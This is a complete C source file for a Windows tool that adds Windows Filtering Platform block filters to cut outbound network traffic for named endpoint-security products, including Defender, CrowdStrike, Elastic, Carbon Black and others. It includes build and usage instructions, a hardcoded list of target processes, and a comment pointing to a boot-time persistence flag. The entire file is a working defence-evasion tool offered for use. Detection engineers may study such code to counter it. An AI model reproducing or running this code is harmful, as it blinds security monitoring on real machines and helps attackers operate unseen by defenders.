/*
 * 01_wfp_block.c
 * WFP Filter Injection — block outbound traffic for named EDR processes
 *
 * Technique: Add BLOCK filters at FWPM_LAYER_ALE_AUTH_CONNECT_V4/V6
 *            matching by application image path.
 *
 * Build:
 *   cl 01_wfp_block.c /link fwpuclnt.lib rpcrt4.lib Advapi32.lib
 *
 * Usage:
 *   01_wfp_block.exe                 (blocks all hardcoded EDR processes)
 *   01_wfp_block.exe MsSense.exe     (blocks specific process by name)
 *   01_wfp_block.exe --remove        (removes all filters added by this tool)
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <fwpmu.h>
#include <fwptypes.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <wchar.h>

#pragma comment(lib, "fwpuclnt.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "Advapi32.lib")

/* Provider GUID — used to tag all filters we add (for easy cleanup) */
static const GUID PROVIDER_GUID = {
    0xDEADBEEF, 0x1337, 0x4242,
    { 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x11 }
};

/* Sublayer GUID */
static const GUID SUBLAYER_GUID = {
    0xCAFEBABE, 0x0001, 0x0002,
    { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08 }
};

static const WCHAR *EDR_PROCESSES[] = {
    L"MsMpEng.exe",          /* Windows Defender */
    L"MsSense.exe",          /* MDE Sensor */
    L"SenseCncProxy.exe",    /* MDE CnC Proxy */
    L"elastic-agent.exe",    /* Elastic */
    L"elastic-endpoint.exe",
    L"xagt.exe",             /* FireEye/Trellix */
    L"CSFalconService.exe",  /* CrowdStrike */
    L"CSFalconContainer.exe",
    L"cb.exe",               /* CarbonBlack */
    L"cbdefense.exe",
    L"LogRhythmSysMonAgent.exe",
    L"QualysAgent.exe",
    L"cylancesvc.exe",       /* Cylance */
    L"sfc.exe",              /* Symantec */
    L"ds_agent.exe",         /* TrendMicro */
    NULL
};

/* ------------------------------------------------------------------ */

static BOOL GetProcessNtPath(DWORD pid, WCHAR *ntPath, DWORD ntPathLen)
{
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) return FALSE;

    WCHAR win32Path[MAX_PATH] = {0};
    DWORD len = MAX_PATH;
    if (!QueryFullProcessImageNameW(hProcess, 0, win32Path, &len)) {
        CloseHandle(hProcess);
        return FALSE;
    }
    CloseHandle(hProcess);

    /* Convert Win32 path to NT device path via GetVolumeNameForVolumeMountPoint */
    /* Simpler: prepend \Device\HarddiskVolumeX by resolving drive letter */
    WCHAR drive[3] = {win32Path[0], L':', 0};
    WCHAR devicePath[MAX_PATH] = {0};
    if (!QueryDosDeviceW(drive, devicePath, MAX_PATH)) return FALSE;

    /* Replace "C:" with "\Device\HarddiskVolumeX" */
    _snwprintf_s(ntPath, ntPathLen, _TRUNCATE, L"%s%s", devicePath, win32Path + 2);
    return TRUE;
}

static HANDLE OpenBfe(BOOL writable)
{
    FWPM_SESSION0 session = {0};
    session.displayData.name        = L"WFPBlock";
    session.displayData.description = L"EDR network block";
    if (!writable)
        session.flags = FWPM_SESSION_FLAG_DYNAMIC; /* auto-remove on exit */

    HANDLE engine = NULL;
    DWORD err = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, &session, &engine);
    if (err != ERROR_SUCCESS) {
        wprintf(L"[-] FwpmEngineOpen0 failed: 0x%08X\n", err);
        return NULL;
    }
    return engine;
}

static BOOL EnsureSubLayer(HANDLE engine)
{
    /* Check if sublayer exists */
    FWPM_SUBLAYER0 *existing = NULL;
    if (FwpmSubLayerGetByKey0(engine, &SUBLAYER_GUID, &existing) == ERROR_SUCCESS) {
        FwpmFreeMemory0((void **)&existing);
        return TRUE;
    }

    FWPM_SUBLAYER0 sub = {0};
    sub.subLayerKey            = SUBLAYER_GUID;
    sub.displayData.name       = L"EDRBlockSublayer";
    sub.displayData.description = L"EDR block sublayer";
    sub.flags                  = 0;
    sub.weight                 = 0x0100; /* mid-range weight */

    DWORD err = FwpmSubLayerAdd0(engine, &sub, NULL);
    if (err != ERROR_SUCCESS && err != FWP_E_ALREADY_EXISTS) {
        wprintf(L"[-] FwpmSubLayerAdd0 failed: 0x%08X\n", err);
        return FALSE;
    }
    return TRUE;
}

static BOOL AddBlockFilter(HANDLE engine, const WCHAR *ntPath, const GUID *layerKey)
{
    /* Build the APP_ID byte blob from NT path */
    FWP_BYTE_BLOB *appId = NULL;
    DWORD err = FwpmGetAppIdFromFileName0(ntPath, &appId);
    if (err != ERROR_SUCCESS) {
        wprintf(L"  [-] FwpmGetAppIdFromFileName0 failed for %s: 0x%08X\n", ntPath, err);
        return FALSE;
    }

    FWPM_FILTER_CONDITION0 cond = {0};
    cond.fieldKey              = FWPM_CONDITION_ALE_APP_ID;
    cond.matchType             = FWP_MATCH_EQUAL;
    cond.conditionValue.type   = FWP_BYTE_BLOB_TYPE;
    cond.conditionValue.byteBlob = appId;

    /* Generate a unique filter key */
    GUID filterKey;
    UuidCreate(&filterKey);

    UINT64 weight = 0xFFFF; /* high but not maximum — allows EDR self-repair if needed */

    FWPM_FILTER0 filter = {0};
    filter.filterKey                = filterKey;
    filter.displayData.name         = L"EDRBlock";
    filter.displayData.description  = L"Block EDR outbound traffic";
    filter.providerKey              = (GUID *)&PROVIDER_GUID;
    filter.layerKey                 = *layerKey;
    filter.subLayerKey              = SUBLAYER_GUID;
    filter.weight.type              = FWP_UINT64;
    filter.weight.uint64            = &weight;
    filter.action.type              = FWP_ACTION_BLOCK;
    filter.numFilterConditions      = 1;
    filter.filterCondition          = &cond;
    filter.flags                    = 0; /* FWPM_FILTER_FLAG_BOOTTIME for persistence */

    UINT64 filterId = 0;
    err = FwpmFilterAdd0(engine, &filter, NULL, &filterId);
    FwpmFreeMemory0((void **)&appId);

    if (err != ERROR_SUCCESS) {
        wprintf(L"  [-] FwpmFilterAdd0 failed: 0x%08X\n", err);
        return FALSE;
    }

    wprintf(L"  [+] Filter added (ID=%llu)\n", filterId);
    return TRUE;
}

static void BlockProcess(HANDLE engine, const WCHAR *ntPath)
{
    wprintf(L"[*] Blocking: %s\n", ntPath);

    /* Block IPv4 and IPv6 outbound */
    AddBlockFilter(engine, ntPath, &FWPM_LAYER_ALE_AUTH_CONNECT_V4);
    AddBlockFilter(engine, ntPath, &FWPM_LAYER_ALE_AUTH_CONNECT_V6);
}

static void RemoveAllFilters(HANDLE engine)
{
    wprintf(L"[*] Removing all filters added by this tool...\n");

    /* Enumerate all filters and delete those from our provider */
    HANDLE enumHandle = NULL;
    FwpmFilterCreateEnumHandle0(engine, NULL, &enumHandle);

    FWPM_FILTER0 **filters = NULL;
    UINT32 count = 0;
    UINT32 totalRemoved = 0;

    while (FwpmFilterEnum0(engine, enumHandle, 100, &filters, &count) == ERROR_SUCCESS && count > 0) {
        for (UINT32 i = 0; i < count; i++) {
            if (filters[i]->providerKey &&
                IsEqualGUID(filters[i]->providerKey, &PROVIDER_GUID))
            {
                DWORD err = FwpmFilterDeleteByKey0(engine, &filters[i]->filterKey);
                if (err == ERROR_SUCCESS) totalRemoved++;
            }
        }
        FwpmFreeMemory0((void **)&filters);
    }

    FwpmFilterDestroyEnumHandle0(engine, enumHandle);
    wprintf(L"[+] Removed %u filter(s)\n", totalRemoved);
}

static void BlockAllEdrProcesses(HANDLE engine)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W pe = {0};
    pe.dwSize = sizeof(pe);

    if (!Process32FirstW(snap, &pe)) {
        CloseHandle(snap);
        return;
    }

    do {
        /* Check if process name matches any EDR in our list */
        for (int i = 0; EDR_PROCESSES[i] != NULL; i++) {
            if (_wcsicmp(pe.szExeFile, EDR_PROCESSES[i]) == 0) {
                WCHAR ntPath[MAX_PATH * 2] = {0};
                if (GetProcessNtPath(pe.th32ProcessID, ntPath, ARRAYSIZE(ntPath))) {
                    BlockProcess(engine, ntPath);
                } else {
                    wprintf(L"[-] Could not get NT path for %s (PID %lu)\n",
                            pe.szExeFile, pe.th32ProcessID);
                }
                break;
            }
        }
    } while (Process32NextW(snap, &pe));

    CloseHandle(snap);
}

int wmain(int argc, wchar_t *argv[])
{
    wprintf(L"[*] WFP Block Tool\n");

    HANDLE engine = OpenBfe(TRUE);
    if (!engine) return 1;

    /* Ensure sublayer exists */
    if (!EnsureSubLayer(engine)) {
        FwpmEngineClose0(engine);
        return 1;
    }

    if (argc >= 2 && _wcsicmp(argv[1], L"--remove") == 0) {
        RemoveAllFilters(engine);
    } else if (argc >= 2) {
        /* Block specific process name given on command line */
        /* Find it in running processes first */
        BOOL found = FALSE;
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32W pe = {0};
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(snap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, argv[1]) == 0) {
                    WCHAR ntPath[MAX_PATH * 2] = {0};
                    if (GetProcessNtPath(pe.th32ProcessID, ntPath, ARRAYSIZE(ntPath))) {
                        BlockProcess(engine, ntPath);
                        found = TRUE;
                    }
                }
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);
        if (!found) wprintf(L"[-] Process not found: %s\n", argv[1]);
    } else {
        /* Block all known EDR processes */
        BlockAllEdrProcesses(engine);
    }

    FwpmEngineClose0(engine);
    wprintf(L"[*] Done.\n");
    return 0;
}
